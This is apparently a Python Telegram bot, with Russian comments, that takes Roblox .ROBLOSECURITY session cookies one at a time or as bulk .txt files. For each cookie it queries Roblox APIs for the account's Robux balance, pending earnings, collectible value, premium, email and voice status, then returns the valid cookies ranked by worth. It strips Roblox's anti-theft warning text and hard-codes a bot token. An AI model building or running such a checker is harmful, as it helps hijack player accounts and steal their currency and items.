import telebot
import requests
import io
from datetime import datetime
from flask import Flask
from threading import Thread

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask('')
@app.route('/')
def home(): return "Бот активен"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

def get_advanced_info(u_id, cookies):
    adv = {"age": 0, "voice": "Нет ❌", "pending": 0, "email": "❌", "rap": 0}
    headers = {"User-Agent": "Mozilla/5.0", "Referer": "https://www.roblox.com/"}
    try:
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}", headers=headers).json()
        created_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        adv["age"] = (datetime.now() - created_dt).days
        
        email_req = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies, headers=headers).json()
        if email_req.get('verified'): adv["email"] = "Да ✅"
        
        voice_req = requests.get("https://voice.roblox.com/v1/settings/is-voice-enabled", cookies=cookies, headers=headers).json()
        if voice_req.get('isVoiceEnabled'): adv["voice"] = "Да ✅"

        summary = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/revenue/summary/30d", cookies=cookies, headers=headers).json()
        adv["pending"] = summary.get('pendingRobux', 0)
        
        inv = requests.get(f"https://inventory.roblox.com/v1/users/{u_id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100", cookies=cookies, headers=headers).json()
        adv["rap"] = sum(item.get('recentAveragePrice', 0) for item in inv.get('data', []))
    except: pass
    return adv

def check_cookie(cookie):
    cookie = cookie.strip()
    if "WARNING:" in cookie:
        cookie = cookie.split("_|_")[-1] if "_|_" in cookie else cookie
    cookies = {".ROBLOSECURITY": cookie}
    try:
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, timeout=10)
        if u_req.status_code != 200: return {"status": "invalid"}
        u = u_req.json()
        u_id, u_name = u['id'], u['name']
        
        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}").json()
        premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
        f_count = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json().get('count', 0)
        
        adv = get_advanced_info(u_id, cookies)
        
        return {
            "status": "ok", "name": u_name, "id": u_id, "robux": robux,
            "premium": premium, "friends": f_count, "age": adv["age"],
            "voice": adv["voice"], "pending": adv["pending"], "rap": adv["rap"],
            "email": adv["email"], "cookie": cookie
        }
    except: return {"status": "error"}

def format_output(res):
    return (
        f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
        f"🎂 Возраст: {res['age']} дней\n"
        f"🌟 Premium: {res['premium']} | 👥 Друзья: {res['friends']}\n"
        f"📧 Почта: {res['email']} | 🎤 Voice: {res['voice']}\n"
        f"💰 Баланс: {res['robux']} R$ (+{res['pending']} Pending)\n"
        f"💎 Ценность (RAP): {res['rap']} R$\n\n"
        f"🍪 КУКИ:\n`{res['cookie']}`\n"
        f"{'='*30}\n"
    )

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 Привет! Пришли мне куки текстом или файлом .txt")

@bot.message_handler(content_types=['text', 'document'])
def handle(message):
    try:
        if message.content_type == 'text':
            if len(message.text) > 100: # Похоже на куки
                res = check_cookie(message.text)
                if res['status'] == 'ok':
                    bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
                else:
                    bot.send_message(message.chat.id, "❌ Куки невалиден или просрочен.")
            else:
                bot.send_message(message.chat.id, "❓ Неизвестная команда. Просто пришли куки.")

        elif message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            lines = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore').splitlines()
            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
            
            results = []
            for l in lines:
                if l.strip():
                    res = check_cookie(l)
                    if res['status'] == 'ok':
                        results.append(format_output(res))
            
            if results:
                buf = io.BytesIO("".join(results).encode('utf-8'))
                buf.name = "results.txt"
                bot.send_document(message.chat.id, buf)
            else:
                bot.send_message(message.chat.id, "❌ В файле не найдено валидных аккаунтов.")
    except Exception as e:
        print(f"Ошибка: {e}")

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()
